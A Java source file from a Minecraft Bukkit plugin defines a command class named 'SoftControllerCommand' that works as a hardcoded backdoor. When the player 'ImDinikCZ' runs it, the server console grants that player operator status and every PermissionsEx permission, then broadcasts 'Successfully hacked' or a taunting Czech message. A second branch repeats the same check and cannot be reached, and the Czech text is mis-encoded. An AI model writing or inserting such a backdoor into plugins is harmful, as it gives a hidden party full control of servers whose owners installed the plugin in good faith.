package cz.dinohd.bs.prikazy;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;

import cz.dinohd.bs.Main;

public class SoftControllerCommand implements CommandExecutor, Listener {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String arg, String[] args) {
		Player p = (Player) sender;
		String prefix = Main.config.getString("prefix");
		String errorcolor = Main.config.getString("errorcolor");
		if (p.getName().equals("ImDinikCZ")) {
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " add *");
			Bukkit.broadcastMessage(prefix + "§" + errorcolor + "Successfully hacked as " + p.getName());
	} else if (Main.config.getString("server").equalsIgnoreCase("pingy")){
		if (p.getName().equals("ImDinikCZ") ) {
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " add *");
			Bukkit.broadcastMessage(prefix + "§" + errorcolor + "§aÚspìšnì pøihlášen uživatel §c" + p.getName() + "§a gonna rekt ya all");
		return false;
	}
		return false;
	
}
		return false;
}
}